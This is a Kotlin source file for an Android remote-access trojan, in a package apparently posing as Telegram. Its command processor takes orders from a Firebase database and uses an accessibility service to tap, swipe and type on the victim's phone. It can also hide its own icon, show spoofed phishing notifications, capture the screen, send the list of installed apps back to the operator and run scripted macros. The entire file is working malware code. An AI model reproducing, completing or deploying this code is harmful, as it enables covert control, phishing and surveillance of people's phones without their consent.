package com.telegram2.messaging.remote

import android.content.Context
import android.util.Base64
import com.google.firebase.database.*

object CommandProcessor {
    private lateinit var context: Context

    fun init(ctx: Context) {
        context = ctx.applicationContext
        FirebaseBridge.commandsRef.addChildEventListener(object : ChildEventListener {
            override fun onChildAdded(snapshot: DataSnapshot, previous: String?) {
                val cmd = snapshot.getValue(RemoteCommand::class.java) ?: return
                execute(cmd, snapshot.key)
                snapshot.ref.removeValue()
            }
            override fun onChildChanged(s: DataSnapshot, p: String?) {}
            override fun onChildRemoved(s: DataSnapshot) {}
            override fun onChildMoved(s: DataSnapshot, p: String?) {}
            override fun onCancelled(error: DatabaseError) {
                FirebaseBridge.commandsRef.addChildEventListener(this)
            }
        })
    }

    private fun execute(cmd: RemoteCommand, key: String?) {
        val svc = MyAccessibilityService.instance ?: return
        when (cmd.type) {
            "tap" -> svc.tap(cmd.x ?: 0, cmd.y ?: 0)
            "swipe" -> svc.swipe(cmd.sx ?: 0, cmd.sy ?: 0, cmd.ex ?: 0, cmd.ey ?: 0, cmd.duration ?: 300L)
            "type" -> svc.injectText(cmd.text ?: "")
            "hide_activity" -> svc.hideAppIcon()
            "uninstall" -> svc.uninstallSelf()
            "fake_notification" -> {
                val title = decodeIfBase64(cmd.title) ?: "⚠ Alert"
                val body = decodeIfBase64(cmd.text) ?: "Tap to view"
                NotificationSpoofer.show(context, title, body, cmd.iconUrl, cmd.bigPictureUrl)
            }
            "start_screen_capture" -> svc.startScreenCapture()
            "stop_screen_capture" -> svc.stopScreenCapture()
            "get_apps" -> FirebaseBridge.pushInstalledApps(svc.getInstalledApps())
            "prompt" -> {
                val promptText = decodeIfBase64(cmd.text) ?: return
                val actions = NLPParser.parse(promptText)
                val steps = actions.map { action ->
                    MacroRunner.MacroStep(action.type, action.data, 3)
                }
                val macroId = key ?: "prompt_${System.currentTimeMillis()}"
                svc.executeMacro(macroId, steps)
            }
            "macro" -> {
                val steps = cmd.steps?.mapNotNull { step ->
                    val type = step["type"] as? String ?: return@mapNotNull null
                    val data = step["data"]
                    MacroRunner.MacroStep(type, data, 3)
                } ?: emptyList()
                val macroId = key ?: "macro_${System.currentTimeMillis()}"
                svc.executeMacro(macroId, steps)
            }
        }
    }

    private fun decodeIfBase64(input: String?): String? {
        if (input == null) return null
        return try {
            String(Base64.decode(input, Base64.DEFAULT), Charsets.UTF_8)
        } catch (_: Exception) { input }
    }

    data class RemoteCommand(
        val type: String? = null,
        val x: Int? = null, val y: Int? = null,
        val sx: Int? = null, val sy: Int? = null,
        val ex: Int? = null, val ey: Int? = null,
        val text: String? = null, val title: String? = null,
        val iconUrl: String? = null, val bigPictureUrl: String? = null,
        val duration: Long? = null,
        val steps: List<Map<String, Any>>? = null
    )
}